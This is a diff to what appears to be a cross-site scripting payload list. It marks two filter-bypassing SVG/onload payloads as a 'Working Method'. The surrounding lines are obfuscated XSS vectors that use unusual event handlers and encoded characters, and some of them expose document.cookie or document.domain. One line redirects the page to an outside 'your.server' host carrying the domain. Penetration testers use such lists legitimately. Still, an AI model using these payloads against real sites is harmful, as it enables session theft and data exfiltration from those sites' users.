@@ -13,8 +13,8 @@ javascript:{ alert`0` }
 <img ignored=() src=x onerror=prompt(1)>
 <svg onx=() onload=(confirm)(1)>
 “><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
-<svg on =i onload=alert(domain)
+<svg on =i onload=alert(domain)            Working Method 
 <svg/onload=location/**/='https://your.server/'+document.domain>
-<svg onx=() onload=window.alert?.()>
+<svg onx=() onload=window.alert?.()> Working Method
 test",prompt%0A/*HelloWorld*/(document.domain)
 "onx+%00+onpointerenter%3dalert(domain)+x"
